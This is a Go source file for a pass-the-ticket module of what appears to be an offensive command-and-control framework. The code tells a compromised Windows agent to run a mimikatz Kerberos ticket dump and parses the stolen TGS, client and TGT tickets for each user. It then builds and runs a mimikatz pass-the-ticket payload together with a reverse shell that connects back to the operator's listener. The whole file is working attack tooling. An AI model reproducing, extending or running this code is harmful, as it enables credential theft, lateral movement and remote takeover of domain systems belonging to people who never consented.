package local_exploit

import (
	"bufio"
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"fmt"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"
)

type PassTheTicketModule struct {
	c2m           *c2.C2Module
	agentUuid     string
	listenHost    string
	listenPort    string
	dumpedTickets []userTickets
	logger        util.Logger
}

func NewPassTheTicketModule(c2mOpt *c2.C2Module, agentUuidOpt, listenHostOpt, listenPortOpt string) *PassTheTicketModule {
	pttm := PassTheTicketModule{
		c2m:        c2mOpt,
		agentUuid:  agentUuidOpt,
		listenHost: listenHostOpt,
		listenPort: listenPortOpt,
	}
	pttm.logger = util.PassTheTicketLogger(true, "")
	pttm.dumpedTickets = []userTickets{}
	return &pttm
}

func (pttm *PassTheTicketModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pttm.c2m.GetC2Hostname(), pttm.c2m.GetC2Port(), "mimikatz_ticketdump", "windows", "amd64", "mimikatz_ticketdump.exe")
	stpgm.Run()

	jobUuid, err := pttm.c2m.AddJob(pttm.agentUuid, "mimikatz_ticketdump.exe")
	if err != nil {
		pttm.logger.Log.Error(err)
		return
	}
	pttm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pttm.c2m.GetAllAgentJobs(pttm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pttm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pttm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		pttm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			pttm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			pttm.logger.Log.Info("Checking SeDebugPrivilege token...")
			if strings.Contains(results[jobUuid], "Privilege '20' OK") {
				pttm.logger.Log.Notice("SeDebugPrivilege is set.")
				pttm.ParseResults(results[jobUuid])
				pttm.PrintParsedResults()
				fmt.Println("Type a username to execute Pass The Ticket attack in format DOMAIN\\USERNAME\\TicketType\\TicketNumber:")
				fmt.Println()
				scanner := bufio.NewScanner(os.Stdin)
				var ticketKirbiFilename string
				for scanner.Scan() {
					usernamesTicket := scanner.Text()
					formattedUsernamesTicket := util.FormatCommand(usernamesTicket)
					if strings.Compare(formattedUsernamesTicket, "quit") == 0 || strings.Compare(formattedUsernamesTicket, "exit") == 0 {
						return
					} else {
						splittedUsernamesTicket := strings.Split(formattedUsernamesTicket, "\\")
						if len(splittedUsernamesTicket) == 4 {
							selectedUsername := splittedUsernamesTicket[1]
							selectedDomain := splittedUsernamesTicket[0]
							selectedTicket, err := strconv.Atoi(splittedUsernamesTicket[3])
							if err != nil {
								pttm.logger.Log.Error("Don't try to mess with an input!")
								continue
							}
							selectedTicketType := splittedUsernamesTicket[2]
							var selected userTickets
							foundUsername := false
							for _, dumpedUser := range pttm.dumpedTickets {
								if selectedUsername == dumpedUser.Username && selectedDomain == dumpedUser.Domain {
									selected = dumpedUser
									foundUsername = true
								}
							}
							foundTicket := false

							if strings.ToLower(selectedTicketType) == "tgs" {
								for ind, ticket := range selected.TGSTickets {
									if ind == selectedTicket {
										foundTicket = true
										ticketKirbiFilename = ticket.Filename
									}
								}
							} else if strings.ToLower(selectedTicketType) == "client" {
								for ind, ticket := range selected.ClientTickets {
									if ind == selectedTicket {
										foundTicket = true
										ticketKirbiFilename = ticket.Filename
									}
								}
							} else if strings.ToLower(selectedTicketType) == "tgt" {
								for ind, ticket := range selected.TGTTickets {
									if ind == selectedTicket {
										foundTicket = true
										ticketKirbiFilename = ticket.Filename
									}
								}
							} else {
								pttm.logger.Log.Error("Don't try to mess with an input!")
								ticketKirbiFilename = ""
								continue
							}
							if foundUsername && foundTicket {
								break
							}
						} else {
							pttm.logger.Log.Error("Your input incorrect. Try again.\n")
						}
					}
				}
				pttm.RunPthWithReverseShell(ticketKirbiFilename)
			} else {
				pttm.logger.Log.Error("Agent is running as user without SeDebugPrivilege.")
			}
		}
	}
}

type userTickets struct {
	Username      string
	Domain        string
	Server        string
	Time          string
	SID           string
	TGSTickets    []Ticket
	ClientTickets []Ticket
	TGTTickets    []Ticket
}

type Ticket struct {
	Start       string
	End         string
	MaxRenew    string
	ServiceName string
	TargetName  string
	ClientName  string
	Filename    string
}

func (pttm *PassTheTicketModule) ParseResults(results string) {
	identities := strings.Split(results, "Authentication Id")
	for _, identity := range identities {
		if strings.Contains(identity, "Group") {
			identityProperties := strings.Split(identity, "\r\n")
			username := strings.Trim(strings.Split(identityProperties[2], ":")[1], " ")
			domain := strings.Trim(strings.Split(identityProperties[3], ":")[1], " ")
			server := strings.Trim(strings.Split(identityProperties[4], ":")[1], " ")
			time := strings.Trim(strings.Split(identityProperties[5], ":")[1], " ")
			sid := strings.Trim(strings.Split(identityProperties[6], ":")[1], " ")
			tickets := strings.Join(identityProperties[12:len(identityProperties)-1], "\n")
			zeroGroupInd := strings.Index(tickets, "Group 0")
			firstGroupInd := strings.Index(tickets, "Group 1")
			secondGroupInd := strings.Index(tickets, "Group 2")
			tgsTicketsString := tickets[zeroGroupInd:firstGroupInd]
			clientTicketsString := tickets[firstGroupInd:secondGroupInd]
			mimikatzGarbageInd := strings.Index(tickets, "mimikatz(commandline) #")
			var tgtTicketsString string
			if mimikatzGarbageInd != -1 {
				tgtTicketsString = tickets[secondGroupInd:mimikatzGarbageInd]
			} else {
				tgtTicketsString = tickets[secondGroupInd:]
			}
			var tgs []Ticket
			tgsTickets := strings.Split(tgsTicketsString, "\n")
			if len(tgsTickets) > 3 {
				tgs = pttm.ParseTicketGroup(tgsTickets[2:])
			} else {
				tgs = []Ticket{}
			}
			var client []Ticket
			clientTickets := strings.Split(clientTicketsString, "\n")
			if len(clientTickets) > 3 {
				client = pttm.ParseTicketGroup(clientTickets[2:])
			} else {
				client = []Ticket{}
			}
			var tgt []Ticket
			tgtTickets := strings.Split(tgtTicketsString, "\n")
			if len(tgtTickets) > 3 {
				tgt = pttm.ParseTicketGroup(tgtTickets[2:])
			} else {
				tgt = []Ticket{}
			}
			pttm.dumpedTickets = append(pttm.dumpedTickets, userTickets{username, domain, server, time, sid, tgs, client, tgt})
		}
	}
}

func (pttm *PassTheTicketModule) PrintParsedResults() {
	if len(pttm.dumpedTickets) > 0 {
		pttm.logger.Log.Notice("Found some tickets. Printing out...")
		fmt.Println()
		w := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', 0)
		for _, dumpedTicket := range pttm.dumpedTickets {
			if len(dumpedTicket.TGSTickets) > 0 || len(dumpedTicket.ClientTickets) > 0 || len(dumpedTicket.TGTTickets) > 0 {
				fmt.Fprintln(w, "-----")
				fmt.Fprintln(w)
				fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\n\n", dumpedTicket.Username, dumpedTicket.Domain, dumpedTicket.Server, dumpedTicket.Time, dumpedTicket.SID)
				if len(dumpedTicket.TGSTickets) > 0 {
					fmt.Fprint(w, "TGS Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.TGSTickets)
				}
				if len(dumpedTicket.ClientTickets) > 0 {
					fmt.Fprint(w, "Client Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.ClientTickets)
				}
				if len(dumpedTicket.TGTTickets) > 0 {
					fmt.Fprint(w, "TGT Tickets:\n\n")
					pttm.PrintParsedTickets(w, dumpedTicket.TGTTickets)
				}
				fmt.Fprint(w, "\n")
			}
		}
		w.Flush()
		fmt.Println()
	}
}

func (pttm *PassTheTicketModule) PrintParsedTickets(w *tabwriter.Writer, tickets []Ticket) {
	for ind, ticket := range tickets {
		fmt.Fprintf(w, "\tNumber: %v\n", ind)
		fmt.Fprintf(w, "\tStart/End/MaxRenew: %s\t%s\t%s\n", ticket.Start, ticket.End, ticket.MaxRenew)
		fmt.Fprintf(w, "\tServiceName: %s\n", ticket.ServiceName)
		fmt.Fprintf(w, "\tTargetName: %s\n", ticket.TargetName)
		fmt.Fprintf(w, "\tClientName: %s\n\n", ticket.ClientName)
	}
}

func (pttm *PassTheTicketModule) RunPthWithReverseShell(ticketKirbiFilename string) {
	pttm.logger.Log.Infof("Don't forget to start a listener on %s:%s", pttm.listenHost, pttm.listenPort)
	pttm.logger.Log.Info("Generating a Reverse Shell payload...")
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pttm.listenHost, pttm.listenPort, "reverse_shell", "windows", "amd64", "revshell.exe")
	stpgm.Run()
	pttm.logger.Log.Info("Done")
	pttm.logger.Log.Info("Generating a Pass The Ticket payload...")
	stpgm = payload_generator.NewStageTwoPayloadGeneratorModule(pttm.c2m.GetC2Hostname(), pttm.c2m.GetC2Port(), "mimikatz_ptt_reverse_shell", "windows", "amd64", "mimikatz_ptt_reverse_shell.exe")
	stpgm.SetPttParams(ticketKirbiFilename)
	stpgm.Run()
	pttm.logger.Log.Info("Done")
	jobUuid, err := pttm.c2m.AddJob(pttm.agentUuid, "mimikatz_ptt_reverse_shell.exe")
	if err != nil {
		pttm.logger.Log.Error(err)
		return
	}
	pttm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pttm.c2m.GetAllAgentJobs(pttm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pttm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
	} else {
		pttm.logger.Log.Info("Job's completed. You supposed to be getting a PS reverse shell.")
	}
}

func (pttm *PassTheTicketModule) ParseTicketGroup(tickets []string) []Ticket {
	userTickets := []Ticket{}
	tgsTickets := strings.Split(strings.Join(tickets, "\n"), "Start")
	for _, tgsTicket := range tgsTickets[1:] {
		newTicket := Ticket{}
		splittedTicket := strings.Split(tgsTicket, "\n")
		delimiterInd := strings.Index(splittedTicket[0], ":")
		dates := strings.Split(splittedTicket[0][delimiterInd:], ";")
		newTicket.Start = dates[0]
		newTicket.End = dates[1]
		newTicket.MaxRenew = dates[2]
		serviceName := strings.Split(strings.Split(splittedTicket[1], ":")[1], ";")
		newTicket.ServiceName = strings.Join(serviceName, "/")
		targetName := strings.Split(strings.Split(splittedTicket[2], ":")[1], ";")
		newTicket.TargetName = strings.Join(targetName, "/")
		clientName := strings.Split(strings.Split(splittedTicket[3], ":")[1], ";")
		newTicket.ClientName = strings.Join(clientName, "/")
		filenameStart := strings.Index(splittedTicket[8], "[")
		filenameEnd := strings.Index(splittedTicket[8], "!")
		newTicket.Filename = splittedTicket[8][filenameStart : filenameEnd-1]
		userTickets = append(userTickets, newTicket)
	}
	return userTickets
}
